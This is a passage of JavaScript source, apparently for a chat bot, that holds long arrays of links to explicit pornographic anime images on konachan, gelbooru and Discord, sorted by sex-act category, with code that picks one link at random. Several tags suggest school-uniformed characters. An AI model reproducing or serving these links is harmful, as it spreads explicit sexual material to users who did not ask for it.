  "https://konachan.com/image/1458b645954f1641ae4c31cd1718c973/Konachan.com%20-%20292866%20anus%20ass%20bed%20blonde_hair%20blush%20braids%20breasts%20epic7%20headband%20kaetzchen%20long_hair%20navel%20nipples%20nude%20petals%20pussy%20signed%20uncensored%20vibrator.png",
  "https://media.discordapp.net/attachments/527959815717388299/718566958387429396/illust_82115948_20200605_134755.png?width=533&height=834",
  "https://media.discordapp.net/attachments/527959815717388299/721836950218080306/1592112164884.jpg?width=625&height=834",
  "https://media.discordapp.net/attachments/527959815717388299/740760094022566009/sample_d863bca50d09836d68e22f67208ae78f8ab4e184.jpg",
  "https://media.discordapp.net/attachments/527959815717388299/740411281873567804/sample_284fe785fbb6242b2eaa739dab36dfd3421ffcdc.jpg",
  "https://media.discordapp.net/attachments/527959815717388299/740411283140247672/sample_5068651bb0a528b0e5c85e18d94f9c2e24efcc3d.jpg?width=632&height=834",
  "https://media.discordapp.net/attachments/527959815717388299/721411036665610390/image0.jpg?width=595&height=834",
  "https://konachan.com/image/48fd50374cc24ba2429d58b97e5db0ad/Konachan.com%20-%20283498%20breast_hold%20breasts%20fingering%20keruto_ishi%20masturbation%20mikasa_ackerman%20nipples%20panties%20pussy_juice%20shingeki_no_kyojin%20underwear.jpg",
  "https://konachan.com/image/d1492aca433eb29e8f812d9f4e67439e/Konachan.com%20-%20272747%20anal%20blush%20breast_hold%20breasts%20censored%20condom%20ctrlz77%20cum%20dildo%20fingering%20gray_eyes%20long_hair%20nipples%20original%20pussy%20pussy_juice%20tie%20vibrator.jpg",
  "https://media.discordapp.net/attachments/527959815717388299/768748136109047828/-hentai---6203691.png",
  "https://media.discordapp.net/attachments/527959815717388299/740417837566525500/sample_c4a6912bee4940d45194547b9d3d0971050ffab9.jpg?width=582&height=834",
  "https://media.discordapp.net/attachments/779341385140273202/779341416618131466/Konachan.png?width=1201&height=834",
  "https://konachan.com/image/f2b9752297e8343938265ae615036130/Konachan.com%20-%20288259%20bed%20brown_eyes%20cameltoe%20candy%20collar%20lollipop%20long_hair%20maid%20nipples%20no_bra%20original%20panties%20ribbons%20scan%20sousouman%20thighhighs%20underwear%20upskirt.png",
  "https://konachan.com/image/721ee99047577bddd0bddb185fdc44f6/Konachan.com%20-%20273415%20aliasing%20bed%20blonde_hair%20blush%20breast_hold%20breasts%20brown_eyes%20fingering%20headdress%20long_hair%20navel%20nipples%20nude%20pussy_juice%20ryu_jiao%20sword_maiden.jpg",
  "https://media.discordapp.net/attachments/527959815717388299/769458258820726784/760qu6mquqr31.png",
  "https://konachan.com/image/1b32a7921c08c532f595a903a7bf5664/Konachan.com%20-%20273500%20breast_hold%20breasts%20brown_hair%20censored%20close%20dd_%28ijigendd%29%20fingering%20gloves%20masturbation%20nipples%20no_bra%20nopan%20pussy%20school_uniform%20short_hair%20white.png",
  "https://media.discordapp.net/attachments/527959815717388299/719185321505456208/image0.png?width=530&height=833",
  "https://media.discordapp.net/attachments/527959815717388299/740417836933185597/sample_e1cbe7d5332b527f1539feb26cd10a20f3650fc1.jpg?width=582&height=834",
  "https://konachan.com/image/fe1bb2d1509599625867a4f077476826/Konachan.com%20-%20271556%20barefoot%20bed%20black_eyes%20breasts%20censored%20ginhaha%20gray_hair%20masturbation%20navel%20nipples%20nude%20pussy%20pussy_juice%20short_hair%20spread_legs%20white_hair%20wink.png",
  "https://konachan.com/image/e65fcd87d4db64b600ae0c53e31f52f2/Konachan.com%20-%20301675%20anal%20barefoot%20breasts%20cropped%20crown%20lavie%20nipples%20no_bra%20nopan%20original%20pink_hair%20pussy%20red_eyes%20short_hair%20spread_legs%20staff%20tears%20uncensored.png",
  "https://konachan.com/image/0285ead86a27cc15b4ef2c0b483f4712/Konachan.com%20-%20284771%20black_eyes%20black_hair%20blush%20bra%20breast_hold%20breasts%20headphones%20long_hair%20navel%20nipples%20no_bra%20open_shirt%20original%20panties%20pussy_juice%20underwear.jpg",
  "https://konachan.com/image/13e2b46b20d8c33c764ca21087197c20/Konachan.com%20-%20275951%20bra%20breasts%20dress%20fingering%20game_cg%20green_eyes%20green_hair%20long_hair%20masturbation%20muririn%20nipples%20nopan%20pussy%20skirt_lift%20uncensored%20underwear%20yuzusoft.png",
  "https://media.discordapp.net/attachments/527959815717388299/744277341903126552/IMG_1582.JPG?width=695&height=834",
  "https://konachan.com/image/703345dde412907cbcf1bc63f4f90390/Konachan.com%20-%20292416%20aqua_eyes%20aqua_hair%20blush%20breasts%20censored%20dress%20long_hair%20masturbation%20mataro_%28mtr_prpr%29%20nipples%20no_bra%20nopan%20original%20pussy_juice%20tears%20vibrator.png",
  "https://media.discordapp.net/attachments/527959815717388299/769638387187056660/5cf32ec31466a.jpeg?width=730&height=834",
  "https://konachan.com/image/00642425460a0cd5bee946388303da8b/Konachan.com%20-%20291211%20anus%20bed%20blush%20bow%20breasts%20brown_hair%20censored%20game_cg%20green_eyes%20kneehighs%20long_hair%20marmalade%20nipples%20panties%20panty_pull%20ponytail%20pussy%20underwear.png",
  "https://media.discordapp.net/attachments/527959815717388299/773589894052052992/8rrrmy5k65x51.jpg?width=600&height=834",
  "https://konachan.com/image/6eb82ee915514b4dd7aae5b3aec2e11a/Konachan.com%20-%20297920%20anus%20ass%20bed%20breasts%20cameltoe%20censored%20exlic%20garter_belt%20gray_hair%20headband%20nier%20panties%20pussy%20short_hair%20stockings%20thighhighs%20underwear%20watermark.png",
  "https://konachan.com/image/54cc709b2308d970734c268e599c4724/Konachan.com%20-%20304276%20batsuma%20blush%20bow%20breasts%20censored%20fingering%20masturbation%20nipples%20no_bra%20open_shirt%20original%20purple_hair%20pussy%20pussy_juice%20skirt%20spread_legs.jpg",
  "https://media.discordapp.net/attachments/527959815717388299/751951841377648690/73e514f-1.jpg?width=590&height=834",
  "https://media.discordapp.net/attachments/527959815717388299/773295232284360754/IMG_20201101_145218.jpg?width=591&height=834",
  "https://media.discordapp.net/attachments/527959815717388299/740411201917550704/sample_6bdaef5758583188cb9aa5bf3d9bb7caf0f387cf.jpg",
  "https://media.discordapp.net/attachments/527959815717388299/738918012681453618/1596147615769.jpg?width=1196&height=834",
  "https://konachan.com/image/d135281094218117a713a126eb3bda59/Konachan.com%20-%20288938%20animal%20bed%20bell%20blush%20bow%20braids%20breasts%20cat%20catgirl%20fingering%20flowers%20mwwhxl%20nipples%20original%20pussy%20rose%20stockings%20tail%20waifu2x%20watermark%20wink.png",
  "https://media.discordapp.net/attachments/527959815717388299/740760092751953960/68c1a789c5564594af8d82ed5c73804bcf39cf22.jpg?width=625&height=834",
  "https://media.discordapp.net/attachments/527959815717388299/763262871529717801/image0.png?width=590&height=834",
  "https://konachan.com/image/a7b8832e8cd51be71efa1e06726d62bc/Konachan.com%20-%20300365%20anthropomorphism%20barefoot%20bed%20blush%20braids%20brown_hair%20fingering%20headband%20long_hair%20masturbation%20panties%20school_uniform%20skirt%20twintails%20underwear.jpg",
  "https://konachan.com/image/4b46f4e6cad9aba83b7385058f3bf21e/Konachan.com%20-%20302745%20anus%20asa_ni_haru%20blush%20breasts%20gray_hair%20long_hair%20masturbation%20nipples%20purple_eyes%20pussy%20spread_legs%20spread_pussy%20thighhighs%20torn_clothes%20uncensored.jpg",
  "https://konachan.com/image/bce63c75ba26a3dee452f4d5d4284172/Konachan.com%20-%20304786%20blush%20censored%20close%20cum%20fingering%20lize_helesta%20long_hair%20masturbation%20navel%20nijisanji%20nopan%20nude%20penis%20phone%20purple_eyes%20sex%20wet%20white_hair.jpg",
  "https://media.discordapp.net/attachments/527959815717388299/708680740833067078/55.png?width=589&height=834",
  "https://konachan.com/image/f4bdc35634dd0eea8ba5b2d86797a3d5/Konachan.com%20-%20278669%20breasts%20long_hair%20masturbation%20navel%20nipples%20nude%20original%20pointed_ears%20pubic_hair%20purple_hair%20pussy_juice%20ricegnat%20tattoo%20thighhighs%20uncensored.jpg",
  "https://media.discordapp.net/attachments/527959815717388299/720650339635953755/lusciousnet_lusciousnet_22_484278995.png",
  "https://konachan.com/image/45a0019dc82ba236c064c7fa60b7d3cc/Konachan.com%20-%20289638%20animal_ears%20bra%20breast_hold%20fingering%20glasses%20hashimoto_kokai%20masturbation%20original%20panties%20underwear.jpg",
  "https://media.discordapp.net/attachments/527959815717388299/770025434569244692/4e24f42.png?width=511&height=834",
  "https://konachan.com/image/e98a991fc9b85da8c569924e1d236310/Konachan.com%20-%20295842%20anthropomorphism%20azur_lane%20blonde_hair%20breasts%20crown%20fingering%20long_hair%20masturbation%20nipples%20queen_elizabeth_%28azur_lane%29%20suwakana.png",
  "https://konachan.com/image/b2275b83b7b55fa7a79aa47da47c5012/Konachan.com%20-%20292640%20breast_hold%20fingering%20long_hair%20masturbation%20nipples%20original%20panties%20shirt_lift%20thighhighs%20underwear%20wsman.png",
  "https://media.discordapp.net/attachments/527959815717388299/740411201695121408/sample_0095da8760354c714ece63be689a229f3776b63b.jpg",
  "https://konachan.com/image/a366947083f5051dd8cb3558798f6ba1/Konachan.com%20-%20272124%20anus%20ass%20azur_lane%20bed%20blonde_hair%20blue_eyes%20catgirl%20censored%20dildo%20dress%20long_hair%20maid%20mino106%20panties%20pussy%20tears%20thighhighs%20underwear%20vibrator.jpg",
  "https://konachan.com/image/e6005ca3e30c4083c44128c6a58597ed/Konachan.com%20-%20278991%20aoba_moka%20ass%20bang_dream%21%20bed%20blue_eyes%20blush%20fingering%20gray_hair%20hoodie%20masturbation%20naitou_kirara%20nopan%20pussy_juice%20short_hair%20shorts%20uncensored.png",
  "https://konachan.com/image/398f0eb146117b0ad2ae3b14e4be8be7/Konachan.com%20-%20293302%20anus%20blue_hair%20blush%20breasts%20censored%20choker%20demon%20fang%20fingering%20horns%20kimono%20marisayaka%20nijisanji%20nipples%20no_bra%20nopan%20open_shirt%20pussy%20watermark.jpg",
  "https://media.discordapp.net/attachments/527959815717388299/740411202487844874/6304030e393f14d70e68aba9274a0590e2bb8153.png?width=591&height=834",
  "https://media.discordapp.net/attachments/527959815717388299/770025444120330240/ElHM9YkXIAESwoT.png?width=1067&height=834",
  "https://konachan.com/image/f086eb77e8376c3485affecb0bd0dcab/Konachan.com%20-%20293095%20amatsukaze_%28kancolle%29%20anthropomorphism%20ass%20ebifurya%20fingering%20garter_belt%20kantai_collection%20masturbation%20panties%20signed%20sketch%20underwear.png",
  "https://media.discordapp.net/attachments/527959815717388299/732242718453137408/image1.jpg?width=490&height=834",
  "https://konachan.com/image/34cc7d180d3697a0b60d0425ebad698e/Konachan.com%20-%20303863%20amego%20anus%20breasts%20censored%20chiyoda_momo%20green_eyes%20masturbation%20nipples%20nude%20pink_hair%20pussy%20pussy_juice%20spread_legs%20thighhighs%20twintails.png",
  "https://konachan.com/image/326a628ca22a90db52ba10ca33f3b0c0/Konachan.com%20-%20294303%20ass%20dark%20fingering%20idolmaster%20idolmaster_cinderella_girls%20masturbation%20panties%20phone%20pussy_juice%20sunaba_suzume%20underwear%20yumemi_riamu.jpg",
  "https://konachan.com/image/1fd2cebbdc055ec037c6997dbfe41502/Konachan.com%20-%20286054%20black_hair%20blush%20breast_hold%20breasts%20fingering%20masturbation%20nipples%20original%20panties%20pussy_juice%20shirt_lift%20skirt_lift%20toenketsu%20underwear.jpg"
]

const NsfwMasturbasi = masturbasi[Math.floor(Math.random() * masturbasi.length)]


//===============> [ Batas ] <===============\\
const tentacle = [
  "https://media.discordapp.net/attachments/531827778664923137/773578218938695710/7551vtd641x51.png",
  "https://media.discordapp.net/attachments/443583003650818048/764789074191581194/c0ae953.jpg",
  "https://media.discordapp.net/attachments/443583003650818048/745212696802361375/9d37dd9.jpg",
  "https://media.discordapp.net/attachments/443583003650818048/744562136222662746/image0.jpg",
  "https://media.discordapp.net/attachments/531827778664923137/745758733958905947/4345411.webp",
  "https://media.discordapp.net/attachments/531827778664923137/745758644368572516/19493144.webp",
  "https://media.discordapp.net/attachments/531827778664923137/745758735456010391/21141020.webp",
  "https://media.discordapp.net/attachments/531827778664923137/745758825008726226/23076769.webp",
  "https://media.discordapp.net/attachments/443583003650818048/756081978981482566/1c1bea1.jpg",
  "https://media.discordapp.net/attachments/443583003650818048/725800863641239562/f83903e.jpg",
  "https://media.discordapp.net/attachments/443583003650818048/725565213679812638/82106129_p0.png",
  "https://media.discordapp.net/attachments/531827778664923137/745758890301587606/978374.webp",
  "https://media.discordapp.net/attachments/531827778664923137/745758789973573682/15646561.webp",
  "https://media.discordapp.net/attachments/531827778664923137/745758825251995818/21918951.webp",
  "https://media.discordapp.net/attachments/443583003650818048/755158343869399223/d4e1d21.jpg",
  "https://media.discordapp.net/attachments/531827778664923137/745758792893071430/17791043.webp",
  "https://media.discordapp.net/attachments/531827778664923137/749792395364794368/lusciousnet_lusciousnet_jsoq-hentai-tentacles-8_980029619.png",
  "https://media.discordapp.net/attachments/443583003650818048/754533144618598400/danbooru.donmai.us_4094538_1girl_bangs_black_dress_black_gloves_blonde_hair_blue_eyes_blunt_bangs_bl.jpg",  
  "https://media.discordapp.net/attachments/531827778664923137/769442458492731412/1603519760709.jpg",
  "https://media.discordapp.net/attachments/443583003650818048/730975135481462864/82523373_p5.png",
  "https://media.discordapp.net/attachments/531827778664923137/745758791915536484/16597833.webp",
  "https://media.discordapp.net/attachments/531827778664923137/757059549768450079/1.jpg",
  "https://media.discordapp.net/attachments/531827778664923137/757059546903740426/3.jpg",
  "https://media.discordapp.net/attachments/531827778664923137/745758644166983790/4345075.webp",
  "https://media.discordapp.net/attachments/443583003650818048/729892051273121810/cf26fdb.jpg",
  "https://media.discordapp.net/attachments/531827778664923137/745758791722860756/18232364.webp",
  "https://media.discordapp.net/attachments/531827778664923137/765844796207267840/image0.png",
  "https://media.discordapp.net/attachments/531827778664923137/745758645093925034/4345408.webp",
  "https://media.discordapp.net/attachments/531827778664923137/745758644871757894/18232408.webp",
  "https://images-ext-2.discordapp.net/external/NYZZ15GoH0llotcCWawIKfD9pg2khWOEs6oHWWYkNFA/https/i.redd.it/56vqrruvxn651.jpg",
  "https://media.discordapp.net/attachments/443583003650818048/754521630008672336/danbooru.donmai.us_4094532_2girls_aki_rosenthal_arms_up_bangs_bare_shoulders_between_breasts_black_d.jpg",  
  "https://media.discordapp.net/attachments/531827778664923137/770327984414392331/5146a6a.gif",
  "https://media.discordapp.net/attachments/443583003650818048/731211078423412736/image0.png",
  "https://media.discordapp.net/attachments/443583003650818048/744562159391998063/image0.jpg",
  "https://media.discordapp.net/attachments/531827778664923137/745758891823988746/20734855.webp",
  "https://images-ext-2.discordapp.net/external/Z1hn_vbAUsLF585snuh1ZsiWRN7NtjymYFTk2KLYo5k/https/danbooru.donmai.us/data/981f5809de874854c2aadafd7a0ac825.jpg",
  "https://media.discordapp.net/attachments/531827778664923137/745758824819851334/23492073.webp",
  "https://media.discordapp.net/attachments/531827778664923137/745758791307362344/19460609.webp",
  "https://media.discordapp.net/attachments/531827778664923137/745758792670642237/784690.webp",
  "https://media.discordapp.net/attachments/531827778664923137/745758890775281734/3815739.webp",
  "https://media.discordapp.net/attachments/443583003650818048/731211085822034011/image0.png",
  "https://media.discordapp.net/attachments/531827778664923137/745758643621986334/14563131.webp",
  "https://media.discordapp.net/attachments/531827778664923137/745758824413003886/20226727.webp",
  "https://media.discordapp.net/attachments/443583003650818048/729076856757813288/74ad40a.jpg",
  "https://media.discordapp.net/attachments/531827778664923137/767424073511862272/th.jpeg.jpg",
  "https://media.discordapp.net/attachments/531827778664923137/745758890570022982/17790987.webp",
  "https://media.discordapp.net/attachments/746482636465111090/746649624143724575/image0.jpg",
  "https://media.discordapp.net/attachments/443583003650818048/761656606491672596/CheerioNzoth.png",
  "https://media.discordapp.net/attachments/531827778664923137/773295377977704458/lusciousnet_lusciousnet_neo-and-grimm-tentacles-by-shonomi_1686943761.640x0.jpg",
  "https://media.discordapp.net/attachments/531827778664923137/745758824186773504/22826555.webp",
  "https://media.discordapp.net/attachments/531827778664923137/745758734281736202/16629093.webp",
  "https://media.discordapp.net/attachments/443583003650818048/731211064846319696/image0.jpg",
  "https://media.discordapp.net/attachments/443583003650818048/754533102532952165/danbooru.donmai.us_4094886_1girl_bangs_black_dress_black_gloves_blonde_hair_blue_eyes_blunt_bangs_bl.jpg",  
  "https://media.discordapp.net/attachments/531827778664923137/745758789713657936/16691138.webp"
]

const NsfwTentacle = tentacle[Math.floor(Math.random() * tentacle.length)]


//===============> [ Batas ] <===============\\
const gangbang = [
"https://img2.gelbooru.com/samples/34/45/sample_34459111cb632e38a8c40ee942ddf843.jpg",
"https://img2.gelbooru.com/images/31/e7/31e7c44931e7448f4181031594182ed9.jpg",
"https://gelbooru.com/index.php?page=post&s=view&id=5596970&tags=multiple_penises",
"https://img2.gelbooru.com/samples/13/6b/sample_136bed9dc6974c934f568bee7c441cc5.jpg",
"https://img2.gelbooru.com/samples/4b/49/sample_4b493bd0e14ddc012799a72c41ebc1ec.jpg",
"https://img2.gelbooru.com/samples/46/c7/sample_46c7279d81794bc2293fb8dcf1120ac6.jpg",
"https://img2.gelbooru.com/images/1a/5f/1a5f18396a948fb86108de83967f29cb.jpg",
"https://img2.gelbooru.com/images/d7/f9/d7f9aceb5c4250f689c5fca077726541.jpg",
"https://img2.gelbooru.com/samples/a3/07/sample_a307112f00bcc7fa3596ffe2e54b8f42.jpg",
"https://img2.gelbooru.com/images/62/f6/62f600e5ea118bdf1d1681e1e71bd852.jpg",
"https://img2.gelbooru.com/images/62/f6/62f600e5ea118bdf1d1681e1e71bd852.jpg",
"https://img2.gelbooru.com/images/9e/3a/9e3a87763750b8ebbbec5916da579656.jpg",
"https://img2.gelbooru.com/images/6d/9f/6d9f279b25996efbaddb6416dc8235c6.jpg",
"https://img2.gelbooru.com/images/c1/8b/c18bc5cb557d2c63662337bcff56db31.jpg",
"https://img2.gelbooru.com/samples/0f/04/sample_0f04a7ee3ed4ca6885d079aeceeac64c.jpg",
"https://img2.gelbooru.com/images/68/6f/686fc564acdda2858f0f4a032797ef4d.jpg",
"https://img2.gelbooru.com/samples/8a/21/sample_8a21fe7e8c5327bf754e1182fd732095.jpg",
"https://img2.gelbooru.com/samples/b9/66/sample_b9667235ff2c49c75d8cabdb2707785f.jpg",
"https://img2.gelbooru.com/samples/bd/b3/sample_bdb3c0b983a300b78867aaa9b93f63de.jpg",
"https://img2.gelbooru.com/samples/e6/ce/sample_e6ceaa105dea5fe9081cb52fdef92513.jpg",
"https://img2.gelbooru.com/images/37/e8/37e882cbc065a8a1874bc99928cc14ea.jpg",
"https://img2.gelbooru.com/samples/f1/c5/sample_f1c539235686301e85f943665d88fbdc.jpg",
"https://img2.gelbooru.com/samples/32/69/sample_326944dacf4e9b71928280f7066aa253.jpg",
"https://img2.gelbooru.com/samples/6a/0e/sample_6a0e8a07c06dfde5bd1fb5c633bbb59c.jpg",
"https://img2.gelbooru.com/samples/fc/b8/sample_fcb8850246c8aef78eb4e3708eeaab88.jpg",
"https://img2.gelbooru.com/samples/9d/4b/sample_9d4bfd4c996be28a7e54c12678a8c5e2.jpg",
"https://img2.gelbooru.com/samples/e7/6e/sample_e76ee790a06401e7dc6809f3c9c7fc3b.jpg",
"https://img2.gelbooru.com/samples/15/f7/sample_15f7245377fe7189dd7442990215bfea.jpg",
"https://img2.gelbooru.com/images/b2/d0/b2d012e396290bdb4a8c11572cefe9bd.png",
"https://img2.gelbooru.com/images/66/8d/668d9b9c2f30ec0146b53d9fbde021a5.jpg",
"https://img2.gelbooru.com/images/64/83/64833a1ce79e5dc94f7328354ab0a2d7.jpg",
"https://img2.gelbooru.com/samples/88/86/sample_8886c84620e6bf410323c83844556025.jpg",
"https://img2.gelbooru.com/samples/6f/db/sample_6fdb557c345722bbd119a3961328079e.jpg",
"https://img2.gelbooru.com/samples/17/e2/sample_17e217960c692674d0dc74f879c089af.jpg",
"https://img2.gelbooru.com/samples/f4/13/sample_f413ad61e0ae6c07e36754781c06e646.jpg",
"https://img2.gelbooru.com/samples/09/ac/sample_09ac8638fe88834bf6dbabc2ce550aee.jpg",
"https://img2.gelbooru.com/samples/72/8d/sample_728dc0b49e5f051557ede4f47df9326c.jpg",
"https://img2.gelbooru.com/images/4d/a1/4da1613bb4bd119e52e08bc38dd85fe0.jpg",
"https://img2.gelbooru.com/samples/31/dc/sample_31dce5b51052cb58015bfcd645f45c8e.jpg",
"https://img2.gelbooru.com/samples/f1/98/sample_f198f9f3e2d99eaa1bb034205369f2ae.jpg",
"https://img2.gelbooru.com/samples/d5/75/sample_d575c6b47af35d91755c3cb6eb423d3f.jpg",
"https://konachan.com/sample/8f46ff65ee4b208316a0c4bdcc989370/Konachan.com%20-%20317317%20sample.jpg",
"https://konachan.com/sample/2b26ab530b7c6f015873004040e4ae60/Konachan.com%20-%20317285%20sample.jpg",
"https://konachan.com/sample/2009598d749a5a111e61d5c65e3c757c/Konachan.com%20-%20317279%20sample.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/770953743255470140/49feaec0-0192-449a-82b7-44b717d9d849.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/770969329357160498/GIF_52.gif",
"https://cdn.discordapp.com/attachments/770948564947304448/770983088888610826/1c6dc9b8-6e04-45fb-b78f-1aa741e98d2d.gif",
"https://cdn.discordapp.com/attachments/770948564947304448/770986448329506846/3360-xWcGyI07i_A.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/770986610749603861/3471-9vvJccyONJk.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/770987549363535902/16c691dc-bbbc-4c1c-b7e9-d1bc9f4c3d50.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/770988869780635688/3cfbdf1c-d533-4ba9-ab3d-ca49d2ac0b0a.gif",
"https://cdn.discordapp.com/attachments/770948564947304448/770988991394611230/3a7d63407f9f5143517202feea7111fc.jpeg",
"https://cdn.discordapp.com/attachments/770948564947304448/770989484657344512/lusciousnet_swimsuit_slave_949905045.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771000856518721536/0500-JoBwW6kA3kk.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771000963888316456/0503-yDlwnTv6si4.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771001745924816896/0555-it84pW6ebn4.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771002263976017940/603-mq77h7AVEfA.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771002980522655755/0663-d87YM3v4VjE.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771016785435688960/1721-Thyo_5A5g9I.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771016825914916894/1725-XhHmtbknnmQ.jpg",
"https://cdn.discordapp.com/attachments/770948564947304448/771030693425053726/382f3175-dcff-439c-89fb-309ed04d52fd.jpg"
]

const NsfwGangbang = gangbang[Math.floor(Math.random() * gangbang.length)]

const ero = [
"https://media.discordapp.net/attachments/527959391446761473/682672218207027260/A9I9FLW_d.jpg",
"https://media.discordapp.net/attachments/527959391446761473/681855421245554708/J4gfxcR_d.jpg",
"https://media.discordapp.net/attachments/527959391446761473/681790172592865315/xgt7ys7ua1b41.jpg",
"https://media.discordapp.net/attachments/527959391446761473/681790129203052568/image0-5.jpg",
"https://media.discordapp.net/attachments/527959391446761473/681790122743693313/66193871_p0_master1200.png",
"https://media.discordapp.net/attachments/527959391446761473/681790107539341380/image0-7.jpg",
"https://media.discordapp.net/attachments/527959391446761473/681790096722231327/ec32416771771cea8a46f077c62fe174.png",
"https://media.discordapp.net/attachments/527959391446761473/681790083115909154/image2.jpg",
"https://media.discordapp.net/attachments/527959391446761473/681790058176446489/image0-9.jpg",
"https://media.discordapp.net/attachments/527959391446761473/681790048206585924/image2-1.jpg",
"https://media.discordapp.net/attachments/527959391446761473/681790032599973989/IMG_1572905606332.jpg",
"https://media.discordapp.net/attachments/527959391446761473/681790022856474654/image0-10.jpg",
"https://media.discordapp.net/attachments/527959391446761473/673284759065198612/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/671109511976583186/IQqVj85_-_Copy.jpg",
"https://media.discordapp.net/attachments/527959391446761473/670306041048727572/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/668528655043002368/sophia_tanaka_the_wizard_drawn_by_m_da_s_tarou__ffd81eb33f59c40621e5023f29f0df37.jpg",
"https://media.discordapp.net/attachments/527959391446761473/668485777185046538/1_33.jpg",
"https://media.discordapp.net/attachments/527959391446761473/667325160159969290/66193871_p0_master1200.png",
"https://media.discordapp.net/attachments/527959391446761473/666010814938873861/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/665995702551445514/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/665972706323202081/image3.jpg",
"https://media.discordapp.net/attachments/527959391446761473/665972705417363470/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/665712394672013322/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/665259247474573320/full_07da84a5-9f5c.webp",
"https://media.discordapp.net/attachments/527959391446761473/664932180966768657/image1.jpg",
"https://media.discordapp.net/attachments/527959391446761473/664932180966768654/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/657028534623010836/03da4d7036effc392dabce5d4c9db0e1.png",
"https://media.discordapp.net/attachments/527959391446761473/657028190904254469/ec32416771771cea8a46f077c62fe174.png",
"https://media.discordapp.net/attachments/527959391446761473/655453753515835422/image2.jpg",
"https://media.discordapp.net/attachments/527959391446761473/655453752580636693/image1.jpg",
"https://media.discordapp.net/attachments/527959391446761473/655453752580636692/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/651106170995605524/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/643475455151964170/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/643472954684080141/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/643414515928662016/Jh10Eh5.jpg",
"https://media.discordapp.net/attachments/527959391446761473/643414491438120970/vn6udN3.jpg",
"https://media.discordapp.net/attachments/527959391446761473/641678607235678248/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/641405739012718592/IMG_1572823502432.jpg",
"https://media.discordapp.net/attachments/527959391446761473/641405724123201596/IMG_1572717415604.jpg",
"https://media.discordapp.net/attachments/527959391446761473/683505579444011079/9cUvraP_d.jpg",
"https://media.discordapp.net/attachments/527959391446761473/683508839743881241/7LP0hxB_d.jpg",
"https://media.discordapp.net/attachments/527959391446761473/641148731219116052/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/639266734980988938/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/638792710286868496/image0.png",
"https://media.discordapp.net/attachments/527959391446761473/637878322726043669/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/637296785181769779/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/636755521164017674/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/636754317197574155/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/636745919655575552/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/636745915738226739/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/636744380329492481/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/636740594202574848/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/636157761066893325/M6PA37a.jpg",
"https://media.discordapp.net/attachments/527959391446761473/634439280218865695/d5e3d47.jpg",
"https://media.discordapp.net/attachments/527959391446761473/634439279543713802/ba8c3fe.jpg",
"https://media.discordapp.net/attachments/527959391446761473/633618828781289482/1ff5da6.jpg",
"https://media.discordapp.net/attachments/527959391446761473/630451853196525568/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/630451849123856422/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/630042122514595840/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/622732860092055592/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/621442352837427210/sirius_azur_lane_drawn_by_takayaki__a8c6e0862d8666f5d64914dfc7138852.png",
"https://media.discordapp.net/attachments/527959391446761473/611122245611552799/wa2000_girls_frontline_drawn_by_saya_mychristian2__sample-bf4b5ffc8bf7d39c077b56910847ffaf.jpg",
"https://media.discordapp.net/attachments/527959391446761473/611122245099585575/original_drawn_by_shibainu_niki__e608924584a026ad1774bc35b23920d7.png",
"https://media.discordapp.net/attachments/527959391446761473/611122244365713438/nakano_nino_go_toubun_no_hanayome_drawn_by_suisen_21__sample-d374908c0a2dba790fdd0828ccee7f12.jpg",
"https://media.discordapp.net/attachments/527959391446761473/611122243682172928/original_drawn_by_piripun__sample-c7239167f9610c0b7267a2ecd8208f04.jpg",
"https://media.discordapp.net/attachments/527959391446761473/611122242918547456/original_drawn_by_akausuko__sample-a573900473d9d90db9da856ddda01c21.jpg",
"https://media.discordapp.net/attachments/527959391446761473/606527197720870912/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/606519853884637184/75828537_p0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/595244278587064328/x.jpg",
"https://media.discordapp.net/attachments/527959391446761473/592568179444940808/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/592566544425549844/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/592566327755931668/image1.jpg",
"https://media.discordapp.net/attachments/527959391446761473/592238817050886144/Kyonyuu-Anime-Ero-Anime-Maid-5273030.png",
"https://media.discordapp.net/attachments/527959391446761473/590083191142875136/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/582632110263894046/f29b0f8.png",
"https://media.discordapp.net/attachments/527959391446761473/582206981494931457/74827240_p0.png",
"https://media.discordapp.net/attachments/527959391446761473/582198509042925599/8meop31uc7x21.jpg",
"https://media.discordapp.net/attachments/527959391446761473/581828815592882187/image0.jpg",
"https://media.discordapp.net/attachments/527959391446761473/578296008581185550/image0.png",
